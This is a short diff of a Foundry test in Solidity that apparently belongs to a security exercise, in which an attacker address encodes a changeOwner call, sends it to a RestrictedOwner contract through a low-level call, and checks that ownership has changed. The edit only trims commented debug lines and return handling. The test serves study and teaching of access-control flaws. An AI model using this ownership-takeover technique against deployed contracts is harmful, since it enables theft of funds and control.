@@ -64,11 +64,7 @@ contract Call1Test is Test {
         emit log_named_address("owner before attacker", restrictedOwner.owner());
         // call RestrictedOwner
         bytes memory payload = abi.encodeWithSignature("changeOwner(address)", attacker);
-        (bool milady, bytes memory result) = address(restrictedOwner).call(payload);
-        // emit the bytes result of the call after we decode the bytes
-        // result = abi.decode(result, (bytes));
-        // emit log_named_bytes("result", result);
-        // emit address of contract.owner()
+        (bool milady,) = address(restrictedOwner).call(payload);
         emit log_named_address("owner after attacker", restrictedOwner.owner());
         vm.stopPrank();
         // assert that attacker is now owner of restrictedOwner
